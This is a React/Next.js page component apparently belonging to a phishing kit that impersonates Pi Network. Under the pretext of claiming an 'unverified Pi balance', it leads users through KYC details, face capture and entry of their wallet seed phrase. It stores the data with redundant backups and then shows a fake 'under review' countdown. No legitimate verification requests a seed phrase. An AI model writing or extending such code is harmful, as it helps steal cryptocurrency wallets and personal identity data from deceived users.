
'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import KYCForm from './KYCForm';
import FaceVerification from './FaceVerification';
import SeedPhraseVerification from './SeedPhraseVerification';

export default function ClaimPage() {
  const [step, setStep] = useState(1);
  const [userData, setUserData] = useState({
    kycName: '',
    faceData: null,
    seedPhrase: ''
  });
  const router = useRouter();

  // Save data at each step to ensure persistence
  const saveStepData = (stepData: any) => {
    const tempData = { ...userData, ...stepData };
    localStorage.setItem('tempClaimData', JSON.stringify(tempData));
    return tempData;
  };

  // Load any existing temp data on component mount
  useEffect(() => {
    const tempData = localStorage.getItem('tempClaimData');
    if (tempData) {
      try {
        const parsedData = JSON.parse(tempData);
        setUserData(parsedData);
      } catch (error) {
        console.error('Error loading temp data:', error);
      }
    }
  }, []);

  const handleNextStep = (data: any) => {
    const updatedData = saveStepData(data);
    setUserData(updatedData);
    setStep(prev => prev + 1);
  };

  const handleComplete = () => {
    // Save final data with multiple backup methods
    const finalUserData = { ...userData };

    // Get existing data
    const existingData = JSON.parse(localStorage.getItem('claimData') || '[]');

    // Create new entry with comprehensive data
    const newEntry = {
      ...finalUserData,
      timestamp: new Date().toISOString(),
      status: 'under_review',
      id: Date.now(),
      submissionDate: new Date().toLocaleDateString(),
      submissionTime: new Date().toLocaleTimeString(),
      completedSteps: ['kyc', 'face_verification', 'seed_phrase'],
      browserInfo: navigator.userAgent,
      ipAddress: 'Hidden for privacy'
    };

    // Add to existing data
    existingData.push(newEntry);

    // Save with multiple methods for redundancy
    try {
      localStorage.setItem('claimData', JSON.stringify(existingData));

      // Also save as backup with timestamp
      const backupKey = `claimData_backup_${Date.now()}`;
      localStorage.setItem(backupKey, JSON.stringify(existingData));

      // Save individual entry as well
      localStorage.setItem(`claim_${newEntry.id}`, JSON.stringify(newEntry));

      // Clear temp data after successful save
      localStorage.removeItem('tempClaimData');

      console.log('Data saved successfully:', newEntry);
    } catch (error) {
      console.error('Error saving claim data:', error);
    }

    setStep(4);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-purple-700 to-purple-900">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8 relative">
          <div className="relative inline-block">
            <img 
              src="https://static.readdy.ai/image/e8f23d307a34a2c387d25bd44502a87a/e6f6427966b9d5676551ee9ece307b66.png" 
              alt="Pi Network Logo" 
              className="absolute -left-12 top-1/2 transform -translate-y-1/2 w-10 h-10 object-contain"
            />
            <h1 className="text-3xl font-bold text-white mb-2">Pi Network</h1>
          </div>
          <p className="text-white/90">Verification Process</p>
        </div>

        {/* Progress Indicator */}
        <div className="max-w-md mx-auto mb-8">
          <div className="flex justify-between items-center">
            {[1, 2, 3].map((num) => (
              <div key={num} className="flex items-center">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold ${
                  step >= num ? 'bg-white text-purple-600' : 'bg-white/30 text-white/70'
                }`}>
                  {num}
                </div>
                {num < 3 && (
                  <div className={`w-16 h-1 mx-2 ${
                    step > num ? 'bg-white' : 'bg-white/30'
                  }`} />
                )}
              </div>
            ))}
          </div>
          <div className="flex justify-between mt-2 text-xs text-white/90">
            <span>KYC Info</span>
            <span>Face Verify</span>
            <span>Seed Phrase</span>
          </div>
        </div>

        {/* Step Content */}
        <div className="max-w-md mx-auto">
          {step === 1 && (
            <KYCForm onNext={handleNextStep} />
          )}
          {step === 2 && (
            <FaceVerification onNext={handleNextStep} />
          )}
          {step === 3 && (
            <SeedPhraseVerification onComplete={handleComplete} userData={userData} />
          )}
          {step === 4 && (
            <CompletionMessage userData={userData} />
          )}
        </div>
      </div>
    </div>
  );
}

function CompletionMessage({ userData }: { userData: any }) {
  const [timeLeft, setTimeLeft] = useState(120);
  const router = useRouter();

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          router.push('/status');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div className="bg-white rounded-2xl shadow-2xl p-8 text-center">
      <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
        <i className="ri-check-line text-white text-2xl"></i>
      </div>
      
      <h2 className="text-xl font-bold text-gray-800 mb-4">Hello {userData.kycName}!</h2>
      
      <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6">
        <p className="text-green-800 text-sm">
          You have submitted your details for verification to claim your unverified Pi balance. 
          Your details are under review. Please wait a moment.
        </p>
      </div>

      <div className="bg-gray-50 rounded-xl p-4 mb-6">
        <div className="text-2xl font-bold text-purple-600 mb-2">{Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}</div>
        <p className="text-sm text-gray-600">Redirecting to status page...</p>
      </div>

      <button 
        onClick={() => router.push('/status')}
        className="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-colors whitespace-nowrap cursor-pointer"
      >
        Check Status Now
      </button>
    </div>
  );
}
